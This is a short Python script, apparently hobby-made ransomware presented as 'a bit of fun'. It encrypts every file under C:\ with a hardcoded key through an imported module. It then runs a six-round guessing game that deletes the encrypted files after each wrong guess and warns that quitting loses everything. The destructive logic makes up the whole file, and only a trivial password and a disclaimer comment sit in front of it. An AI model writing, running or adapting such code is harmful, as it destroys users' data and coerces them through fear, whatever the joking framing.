#just to add this is just a bit of fun, i would not consider using this.
import encryptionManager
import random
import time
import fileDeleter


rootDirectionary = 'C:\\'
key = "0c92c4e1a35551ed366ca52bf12b6037"  #str(random.getrandbits(32)) < this doesnt work
#I cant find a way to generate a 16 byte key, in python. So im using this for now



password = raw_input("Oh god dont do this accidentally, whats the password: ")  # @UndefinedVariable

if password != "basil":
    exit()


filesChanged = encryptionManager.manage(0, rootDirectionary, key)
             
        



#just a fun sad thing I made
print("Lets play a little game shall we?")
print("Guess a number between 1 and 6")
print("Every time you guess the wrong number a percentage of windows32 is deleted")
print("You have to survive 6 guesses")
print("Also all the files on your computer are now encrypted, meaning that if you")
print(" exit this program you will not get any of your files back.")
print("If you survive they will be decrypted")



for i in range(6):
    answer = random.randint(1,6)
    userInput = int(input("Go on, input something"))
    if userInput != answer:
        print("Oh dear, oh dear")
        time.sleep(3)
        fileDeleter.deleteFiles(filesChanged)
print("Your files will now be decrypted, have a nice day!")
encryptionManager.manage(1, rootDirectionary, key)
exit()        
        
        